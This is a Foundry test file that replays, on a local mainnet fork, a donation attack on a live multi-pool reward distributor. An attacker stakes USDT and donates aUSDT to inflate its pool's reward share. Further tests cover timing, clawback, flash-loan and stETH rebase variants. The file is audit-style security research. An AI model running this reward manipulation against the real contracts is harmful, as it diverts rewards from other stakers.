// SPDX-License-Identifier: MIT
// CAP-A1 siblings, round 2 (2026-11-16): timing around the distributeRewards cadence,
// intervening stakes/withdraws, donation clawback paths, Aave flash-loan donation,
// and stETH donation timing vs the Lido rebase.
// Fork: Ethereum mainnet block 26424044, RPC https://eth.drpc.org (same block as
// CAP-A1 / deep-dive so numbers are comparable; live refresh 2026-11-16 08:47 WIB
// shows the state is essentially unchanged: block 26424389, same impl versions,
// same pools, stETH excess still exactly 0.2359 stETH).
// Local fork only. Attacker/victim/bystander = ordinary addresses, no privilege.
// Nothing is submitted anywhere.
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IStETH {
    function submit(address referral) external payable returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IDepositPool {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function withdraw(uint256 rewardPoolIndex_, uint256 amount_) external;
    function getLatestUserReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
    function rewardPoolsData(uint256)
        external
        view
        returns (uint128 lastUpdate, uint256 rate, uint256 totalVirtualDeposited);
}

interface IDistributor {
    function distributeRewards(uint256 rewardPoolIndex_) external;
    function withdrawYield(uint256 rewardPoolIndex_, address depositPoolAddress_) external;
    function withdraw(uint256 rewardPoolIndex_, address receiver_, uint256 amount_) external returns (uint256);
    function rewardPoolLastCalculatedTimestamp(uint256) external view returns (uint128);
    function distributedRewards(uint256, address) external view returns (uint256);
    function minRewardsDistributePeriod() external view returns (uint256);
    function chainLinkDataConsumer() external view returns (address);
    function depositPools(uint256, address)
        external
        view
        returns (
            address token,
            string memory chainLinkPath,
            uint256 tokenPrice,
            uint256 deposited,
            uint256 lastUnderlyingBalance,
            uint8 strategy,
            address aToken,
            bool isExist
        );
}

interface IPriceConsumer {
    function getPathId(string memory path_) external pure returns (bytes32);
    function getChainLinkDataFeedLatestAnswer(bytes32 pathId_) external view returns (uint256);
}

interface IAavePool {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata interestRateModes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IL1Sender {
    function sendWstETH(uint256 gasLimit_, uint256 maxFeePerGas_, uint256 maxSubmissionCost_)
        external
        payable
        returns (bytes memory);
    function swapExactInputMultihop(
        address[] calldata tokens_,
        uint24[] calldata poolsFee_,
        uint256 amountIn_,
        uint256 amountOutMinimum_,
        uint256 deadline_
    ) external returns (uint256);
}

// Flash-loan receiver used by test_B3: borrows USDT, donates it to the Distributor
// (supply to Aave onBehalfOf DIST), settles, then does NOT repay the loan.
// Aave v3 pulls repayment via transferFrom; with no allowance/balance the whole
// transaction must revert, proving the flash-loan variant cannot extract value.
contract FlashDonor {
    address constant DIST = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;

    function executeOperation(
        address[] calldata assets_,
        uint256[] calldata amounts_,
        uint256[] calldata /* premiums_ */,
        address /* initiator_ */,
        bytes calldata /* params_ */
    ) external returns (bool) {
        // Donate the borrowed USDT: supply to Aave on behalf of the Distributor.
        (bool ok_, ) = assets_[0].call(
            abi.encodeWithSelector(
                bytes4(keccak256("approve(address,uint256)")), AAVE_POOL, type(uint256).max
            )
        );
        require(ok_, "approve failed");
        IAavePool(AAVE_POOL).supply(assets_[0], amounts_[0], DIST, 0);
        // Settle while the donation is in place.
        IDistributor(DIST).distributeRewards(0);
        // Deliberately NO repayment approval and NO funds left: Aave's
        // transferFrom for amounts_[0] + premium must fail -> whole tx reverts.
        return true;
    }
}

contract DeepDive2Test is Test {
    uint256 constant FORK_BLOCK = 26424044;
    string constant RPC_URL = "https://eth.drpc.org";

    address constant DIST = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address constant L1SENDER = 0x2Efd4430489e1a05A89c2f51811aC661B7E5FF84;
    address constant STETH_POOL = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790;
    address constant WBTC_POOL = 0xdE283F8309Fd1AA46c95d299f6B8310716277A42;
    address constant WETH_POOL = 0x9380d72aBbD6e0Cc45095A2Ef8c2CA87d77Cb384;
    address constant USDC_POOL = 0x6cCE082851Add4c535352f596662521B4De4750E;
    address constant USDT_POOL = 0x3B51989212BEdaB926794D6bf8e9E991218cf116;

    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address constant AUSDT = 0x23878914EFE38d27C4D67Ab83ed1b93A74D4086a;
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;

    uint256 constant VICTIM_STETH = 100 ether;
    uint256 constant STAKE_S05 = 36_729_288_039; // 1x existing USDT virtual -> 50% pool share
    uint256 constant REBASE_SIM = 0.23592259698427018 ether; // measured daily rebase, block 26420373
    // stETH deposited in Distributor at fork block (live state, for rebase scaling).
    uint256 constant STETH_DEPOSITED = 3582149442067071049550;

    address[5] internal POOLS = [STETH_POOL, WBTC_POOL, WETH_POOL, USDC_POOL, USDT_POOL];

    IDistributor dist = IDistributor(DIST);
    IDepositPool stethPool = IDepositPool(STETH_POOL);
    IDepositPool usdcPool = IDepositPool(USDC_POOL);
    IDepositPool usdtPool = IDepositPool(USDT_POOL);

    address attacker = makeAddr("dd2Attacker");
    address victim = makeAddr("dd2Victim");
    address bystander = makeAddr("dd2Bystander");
    address lidoSim = makeAddr("dd2LidoSim");
    address aaveHelper = makeAddr("dd2AaveHelper");

    // ---------- harness (same fork mechanics as CapA1.t.sol / DeepDive.t.sol) ----------

    function _pinPrices() internal {
        address consumer_ = dist.chainLinkDataConsumer();
        for (uint256 i = 0; i < POOLS.length; i++) {
            (, string memory path_,,,,,, bool isExist_) = dist.depositPools(0, POOLS[i]);
            if (!isExist_) continue;
            bytes32 pid_ = IPriceConsumer(consumer_).getPathId(path_);
            uint256 px_ = IPriceConsumer(consumer_).getChainLinkDataFeedLatestAnswer(pid_);
            require(px_ > 0, "price capture failed");
            vm.mockCall(
                consumer_,
                abi.encodeWithSelector(IPriceConsumer.getChainLinkDataFeedLatestAnswer.selector, pid_),
                abi.encode(px_)
            );
        }
    }

    function _approveRaw(address token_, address spender_, uint256 amount_) internal {
        (bool ok_, ) = token_.call(
            abi.encodeWithSelector(bytes4(keccak256("approve(address,uint256)")), spender_, amount_)
        );
        require(ok_, "approve failed");
    }

    function _stakeVictimSteth() internal {
        vm.deal(victim, VICTIM_STETH);
        vm.startPrank(victim);
        IStETH(STETH).submit{value: VICTIM_STETH}(address(0));
        uint256 bal_ = IStETH(STETH).balanceOf(victim);
        IStETH(STETH).approve(DIST, type(uint256).max);
        IStETH(STETH).approve(STETH_POOL, type(uint256).max);
        stethPool.stake(0, bal_, 0, address(0));
        vm.stopPrank();
    }

    function _stakeAttackerUsdt(uint256 amount_) internal {
        deal(USDT, attacker, amount_);
        vm.startPrank(attacker);
        _approveRaw(USDT, DIST, type(uint256).max);
        _approveRaw(USDT, USDT_POOL, type(uint256).max);
        usdtPool.stake(0, amount_, 0, address(0));
        vm.stopPrank();
    }

    function _stakeBystander(address pool_, address token_, uint256 amount_) internal {
        deal(token_, bystander, amount_);
        vm.startPrank(bystander);
        _approveRaw(token_, DIST, type(uint256).max);
        _approveRaw(token_, pool_, type(uint256).max);
        IDepositPool(pool_).stake(0, amount_, 0, address(0));
        vm.stopPrank();
    }

    function _refreshAaveIndexes() internal {
        address[4] memory assets_ = [USDC, USDT, WETH, WBTC];
        uint256[4] memory amounts_ = [uint256(100e6), uint256(100e6), uint256(0.1 ether), uint256(0.01e8)];
        for (uint256 i = 0; i < assets_.length; i++) {
            deal(assets_[i], aaveHelper, amounts_[i]);
            vm.startPrank(aaveHelper);
            _approveRaw(assets_[i], AAVE_POOL, type(uint256).max);
            IAavePool(AAVE_POOL).supply(assets_[i], amounts_[i], aaveHelper, 0);
            IAavePool(AAVE_POOL).withdraw(assets_[i], type(uint256).max, aaveHelper);
            vm.stopPrank();
        }
    }

    function _simulateLidoRebase(uint256 amount_) internal {
        vm.deal(lidoSim, amount_);
        vm.startPrank(lidoSim);
        IStETH(STETH).submit{value: amount_}(address(0));
        uint256 bal_ = IStETH(STETH).balanceOf(lidoSim);
        IStETH(STETH).transfer(DIST, bal_);
        vm.stopPrank();
    }

    function _donateAUsdt(uint256 usdtAmount_) internal returns (uint256) {
        deal(USDT, attacker, usdtAmount_);
        vm.startPrank(attacker);
        _approveRaw(USDT, AAVE_POOL, type(uint256).max);
        IAavePool(AAVE_POOL).supply(USDT, usdtAmount_, attacker, 0);
        uint256 aBal_ = IERC20(AUSDT).balanceOf(attacker);
        IERC20(AUSDT).transfer(DIST, aBal_);
        vm.stopPrank();
        return aBal_;
    }

    function _donateSteth(uint256 amount_) internal {
        vm.deal(attacker, amount_);
        vm.startPrank(attacker);
        IStETH(STETH).submit{value: amount_}(address(0));
        uint256 bal_ = IStETH(STETH).balanceOf(attacker);
        IStETH(STETH).transfer(DIST, bal_);
        vm.stopPrank();
    }

    function _snapshotDistributed() internal view returns (uint256[5] memory snap_) {
        for (uint256 i = 0; i < 5; i++) {
            snap_[i] = dist.distributedRewards(0, POOLS[i]);
        }
    }

    function _settleNextWindow() internal returns (uint256[5] memory d_, uint256 tot_) {
        uint256[5] memory before_ = _snapshotDistributed();
        uint256 gate_ = uint256(dist.rewardPoolLastCalculatedTimestamp(0)) + dist.minRewardsDistributePeriod();
        vm.warp(gate_ + 1);
        dist.distributeRewards(0);
        uint256[5] memory after_ = _snapshotDistributed();
        for (uint256 i = 0; i < 5; i++) {
            d_[i] = after_[i] - before_[i];
            tot_ += d_[i];
        }
    }

    function _yieldOf(address pool_) internal view returns (uint256) {
        (address token_,, uint256 price_,, uint256 lub_, uint8 strat_, address aToken_,) =
            dist.depositPools(0, pool_);
        address yieldToken_ = strat_ == 2 ? aToken_ : token_;
        uint256 bal_ = IERC20(yieldToken_).balanceOf(DIST);
        if (bal_ <= lub_) return 0;
        uint8 dec_ = IERC20(yieldToken_).decimals();
        uint256 underlying18_ = (bal_ - lub_) * (10 ** (18 - dec_));
        return underlying18_ * price_;
    }

    function _setupW1WithS05() internal {
        vm.createSelectFork(RPC_URL, FORK_BLOCK);
        _pinPrices();
        uint128 lastCalc_ = dist.rewardPoolLastCalculatedTimestamp(0);
        uint256 gate1_ = uint256(lastCalc_) + dist.minRewardsDistributePeriod();
        assertLt(block.timestamp, gate1_, "fork must sit inside the closed window");
        _stakeVictimSteth();
        _stakeAttackerUsdt(STAKE_S05);
        (uint256[5] memory d1_, uint256 tot1_) = _settleNextWindow();
        console.log("W1 tranche MOR wei:", tot1_);
        console.log("W1 USDT share bps:", tot1_ == 0 ? 0 : (d1_[4] * 10000) / tot1_);
    }

    // ---------- B1 (timing): early vs late donation ----------

    function _runTiming(bool early_) internal returns (uint256 usdtShareBps_, uint256 attackerW2_) {
        _setupW1WithS05();
        if (early_) {
            _donateAUsdt(100e6);
            console.log("donated early (right after W1)");
        }
        _refreshAaveIndexes();
        _simulateLidoRebase(REBASE_SIM);
        if (!early_) {
            // Donate after the warp, immediately before settlement.
            uint256 gate_ = uint256(dist.rewardPoolLastCalculatedTimestamp(0)) + dist.minRewardsDistributePeriod();
            vm.warp(gate_ + 1);
            _donateAUsdt(100e6);
            console.log("donated late (right before W2 settlement)");
            uint256[5] memory before_ = _snapshotDistributed();
            uint256 attBefore_ = usdtPool.getLatestUserReward(0, attacker);
            dist.distributeRewards(0);
            uint256[5] memory after_ = _snapshotDistributed();
            uint256 tot_ = 0;
            for (uint256 i = 0; i < 5; i++) tot_ += after_[i] - before_[i];
            usdtShareBps_ = (after_[4] - before_[4]) * 10000 / tot_;
            attackerW2_ = usdtPool.getLatestUserReward(0, attacker) - attBefore_;
            return (usdtShareBps_, attackerW2_);
        }
        uint256 attBefore2_ = usdtPool.getLatestUserReward(0, attacker);
        (uint256[5] memory d2_, uint256 tot2_) = _settleNextWindow();
        usdtShareBps_ = tot2_ == 0 ? 0 : (d2_[4] * 10000) / tot2_;
        attackerW2_ = usdtPool.getLatestUserReward(0, attacker) - attBefore2_;
        console.log("W2 tranche MOR wei:", tot2_);
    }

    function test_B1_EarlyVsLateDonation() public {
        (uint256 shareEarly_, uint256 attEarly_) = _runTiming(true);
        (uint256 shareLate_, uint256 attLate_) = _runTiming(false);
        console.log("USDT share bps early:", shareEarly_);
        console.log("USDT share bps late:", shareLate_);
        console.log("attacker W2 MOR early:", attEarly_);
        console.log("attacker W2 MOR late:", attLate_);
        // Both must show the donation counted (CAP-A1 S05 D100 baseline: ~1781 bps).
        assertGt(shareEarly_, 1000, "early donation must inflate USDT share");
        assertGt(shareLate_, 1000, "late donation must inflate USDT share");
        // And the timing must not matter materially: early donation only earns the
        // trivial Aave accrual on the donated aUSDT itself (~$0.01/day).
        uint256 diff_ = shareEarly_ > shareLate_ ? shareEarly_ - shareLate_ : shareLate_ - shareEarly_;
        assertLt(diff_, 100, "early vs late share must differ by < 100 bps");
        uint256 attDiff_ = attEarly_ > attLate_ ? attEarly_ - attLate_ : attLate_ - attEarly_;
        assertLt(attDiff_, 5 ether, "attacker W2 MOR must differ by < 5 MOR");
    }

    // ---------- B1 (timing): intervening stake/withdraw must not erase the donation ----------

    function test_B1_InterveningStakeDoesNotEraseDonation() public {
        _setupW1WithS05();
        _donateAUsdt(100e6);
        // Third party stakes $10k USDT + $10k USDC, then withdraws $5k USDT.
        // Each action triggers Distributor.supply/withdraw -> distributeRewards
        // (gate closed, early return) + _withdrawYield (sweeps ONLY already-
        // measured yield, lastUnderlyingBalance - deposited).
        uint256 aBalBefore_ = IERC20(AUSDT).balanceOf(DIST);
        (,,, , uint256 lubBefore_,,,) = dist.depositPools(0, USDT_POOL);
        _stakeBystander(USDT_POOL, USDT, 10_000e6);
        _stakeBystander(USDC_POOL, USDC, 10_000e6);
        // withdrawYield is the other sweep path: it calls distributeRewards
        // (gate closed, early return) then _withdrawYield (sweeps ONLY
        // already-measured yield, lastUnderlyingBalance - deposited).
        // (A fresh bystander stake cannot be withdrawn yet: DepositPool
        // withdraw is locked 7 days after stake -- "DS: pool withdraw is
        // locked" -- so no withdraw is attempted here.)
        dist.withdrawYield(0, USDT_POOL);
        dist.withdrawYield(0, USDC_POOL);
        uint256 aBalAfter_ = IERC20(AUSDT).balanceOf(DIST);
        (,,, , uint256 lubAfter_,,,) = dist.depositPools(0, USDT_POOL);
        console.log("aUSDT bal before intervening actions:", aBalBefore_);
        console.log("aUSDT bal after intervening actions:", aBalAfter_);
        console.log("unmeasured gap (bal - LUB) before:", aBalBefore_ - lubBefore_);
        console.log("unmeasured gap (bal - LUB) after:", aBalAfter_ - lubAfter_);
        // The donation gap must survive: _withdrawYield only sweeps the
        // already-measured yield (lastUnderlyingBalance - deposited), so the
        // balance above lastUnderlyingBalance is untouched by any of these.
        assertGe(aBalAfter_ - lubAfter_, 99e6, "donation gap must survive intervening actions");
        _refreshAaveIndexes();
        _simulateLidoRebase(REBASE_SIM);
        uint256 attBefore_ = usdtPool.getLatestUserReward(0, attacker);
        (uint256[5] memory d2_, uint256 tot2_) = _settleNextWindow();
        uint256 share_ = tot2_ == 0 ? 0 : (d2_[4] * 10000) / tot2_;
        uint256 attW2_ = usdtPool.getLatestUserReward(0, attacker) - attBefore_;
        console.log("W2 USDT share bps:", share_);
        console.log("W2 attacker MOR:", attW2_);
        assertGt(share_, 1000, "donation must still inflate USDT share after intervening actions");
        assertGt(attW2_, 100 ether, "attacker must still earn > 100 MOR in W2");
    }

    // ---------- B5: donation cannot be clawed back ----------

    function test_B5_DonationCannotBeClawedBack() public {
        _setupW1WithS05();
        _donateAUsdt(100e6);
        // (a) withdrawYield is public, but it only sweeps already-measured yield
        // (lastUnderlyingBalance - deposited) to l1Sender, never to the caller,
        // and the donation sits ABOVE lastUnderlyingBalance, so it is untouched.
        uint256 aBalBefore_ = IERC20(AUSDT).balanceOf(DIST);
        (,,, , uint256 lubBefore_,,,) = dist.depositPools(0, USDT_POOL);
        uint256 gapBefore_ = aBalBefore_ - lubBefore_;
        assertGe(gapBefore_, 99e6, "donation gap must be present before withdrawYield");
        vm.prank(attacker);
        dist.withdrawYield(0, USDT_POOL);
        uint256 aBalAfterWYD_ = IERC20(AUSDT).balanceOf(DIST);
        (,,, , uint256 lubAfter_,,,) = dist.depositPools(0, USDT_POOL);
        uint256 gapAfter_ = aBalAfterWYD_ - lubAfter_;
        console.log("aUSDT bal before withdrawYield:", aBalBefore_);
        console.log("aUSDT bal after withdrawYield:", aBalAfterWYD_);
        console.log("unmeasured gap before:", gapBefore_);
        console.log("unmeasured gap after:", gapAfter_);
        console.log("swept by withdrawYield (pre-existing measured yield only):", aBalBefore_ - aBalAfterWYD_);
        // The sweep may only take the already-measured real yield (~$0.82
        // here); the $100 donation gap above lastUnderlyingBalance survives.
        assertGe(gapAfter_, 99e6, "withdrawYield must not touch the unmeasured donation");
        assertLt(aBalBefore_ - aBalAfterWYD_, 2e6, "sweep must be small real yield, not the donation");
        assertEq(IERC20(AUSDT).balanceOf(attacker), 0, "attacker must receive nothing from withdrawYield");
        // (b) Distributor.withdraw is DepositPool-only.
        vm.prank(attacker);
        vm.expectRevert();
        dist.withdraw(0, attacker, 100e6);
        // (c) L1Sender yield-moving functions are onlyOwner.
        vm.prank(attacker);
        vm.expectRevert();
        IL1Sender(L1SENDER).sendWstETH(200000, 1 gwei, 0);
        // (d) The donation still counts at the next open settlement.
        _refreshAaveIndexes();
        _simulateLidoRebase(REBASE_SIM);
        uint256 attBefore_ = usdtPool.getLatestUserReward(0, attacker);
        (uint256[5] memory d2_, uint256 tot2_) = _settleNextWindow();
        uint256 share_ = tot2_ == 0 ? 0 : (d2_[4] * 10000) / tot2_;
        assertGt(share_, 1000, "donation must still count after failed clawback attempts");
        console.log("W2 USDT share bps:", share_);
        console.log("W2 attacker MOR:", usdtPool.getLatestUserReward(0, attacker) - attBefore_);
        // (e) After settlement, the donation is swept to l1Sender (protocol),
        // never to the attacker: trigger the sweep, then check destinations.
        uint256 l1UsdtBefore_ = IERC20(USDT).balanceOf(L1SENDER);
        dist.withdrawYield(0, USDT_POOL);
        uint256 l1UsdtAfter_ = IERC20(USDT).balanceOf(L1SENDER);
        console.log("L1Sender USDT before sweep:", l1UsdtBefore_);
        console.log("L1Sender USDT after sweep:", l1UsdtAfter_);
        assertGe(l1UsdtAfter_ - l1UsdtBefore_, 99e6, "donation must land in L1Sender after sweep");
        assertEq(IERC20(AUSDT).balanceOf(attacker), 0, "attacker aUSDT must stay 0");
        assertEq(IERC20(USDT).balanceOf(attacker), 0, "attacker USDT must stay 0");
    }

    // ---------- B3: Aave flash-loan donation cannot be repaid ----------

    function test_B3_FlashLoanDonationCannotBeRepaid() public {
        _setupW1WithS05();
        _refreshAaveIndexes();
        _simulateLidoRebase(REBASE_SIM);
        // Warp to the open gate so distributeRewards inside the flash loan
        // would actually settle (and count the donation) if it could run.
        uint256 gate_ = uint256(dist.rewardPoolLastCalculatedTimestamp(0)) + dist.minRewardsDistributePeriod();
        vm.warp(gate_ + 1);
        FlashDonor donor_ = new FlashDonor();
        address[] memory assets_ = new address[](1);
        assets_[0] = USDT;
        uint256[] memory amounts_ = new uint256[](1);
        amounts_[0] = 100e6;
        uint256[] memory modes_ = new uint256[](1);
        modes_[0] = 0; // no-debt flash loan
        // The flash loan must revert: the receiver donates the borrowed USDT
        // to the Distributor and settles, leaving nothing to repay Aave, and
        // the MOR reward is only a rate credit locked 14 days -- it cannot
        // repay a same-transaction loan.
        uint256 usdtDistBefore_ = dist.distributedRewards(0, USDT_POOL);
        vm.expectRevert();
        IAavePool(AAVE_POOL).flashLoan(address(donor_), assets_, amounts_, modes_, address(donor_), "", 0);
        // And the revert is atomic: no donation persisted, no settlement happened.
        assertEq(
            dist.distributedRewards(0, USDT_POOL),
            usdtDistBefore_,
            "reverted flash loan must leave distributedRewards unchanged"
        );
        console.log("USDT distributedRewards unchanged at:", usdtDistBefore_);
    }

    // ---------- B4: stETH donation before vs after the Lido rebase ----------

    function _runRebase(bool donateBefore_) internal returns (uint256 yieldPre_) {
        vm.createSelectFork(RPC_URL, FORK_BLOCK);
        _pinPrices();
        _stakeVictimSteth();
        (, uint256 tot1_) = _settleNextWindow();
        console.log("W1 tranche:", tot1_);
        _refreshAaveIndexes();
        if (donateBefore_) {
            _donateSteth(10 ether);
            // Rebase scales with the Distributor's total stETH incl. donation.
            uint256 scaled_ = (REBASE_SIM * (STETH_DEPOSITED + 10 ether)) / STETH_DEPOSITED;
            _simulateLidoRebase(scaled_);
            console.log("rebase (scaled, donation in):", scaled_);
        } else {
            _simulateLidoRebase(REBASE_SIM);
            _donateSteth(10 ether);
            console.log("rebase (plain, donation after):", REBASE_SIM);
        }
        yieldPre_ = _yieldOf(STETH_POOL);
        console.log("stETH yield pre-W2 (yield units):", yieldPre_);
    }

    function test_B4_RebaseDonationBeforeVsAfter() public {
        uint256 yieldBefore_ = _runRebase(true);
        uint256 yieldAfter_ = _runRebase(false);
        console.log("yield donation-before-rebase:", yieldBefore_);
        console.log("yield donation-after-rebase:", yieldAfter_);
        // Before-rebase must be higher ONLY by the genuine rebase earned on the
        // donated 10 stETH itself: 10 * 0.2359/3582.15 = ~0.000658 stETH ~ $1.20.
        // In yield units (underlying18 * price ~1.816e21): ~0.000658e18 * 1.816e21 ~= 1.2e36.
        assertGt(yieldBefore_, yieldAfter_, "donation before rebase must earn the rebase on itself");
        uint256 diff_ = yieldBefore_ - yieldAfter_;
        console.log("difference (yield units):", diff_);
        assertGe(diff_, 0.5e36, "extra must be at least ~$0.50 (genuine rebase on donation)");
        assertLe(diff_, 2e36, "extra must be at most ~$2.00 -- no double-count, no amplification");
    }
}
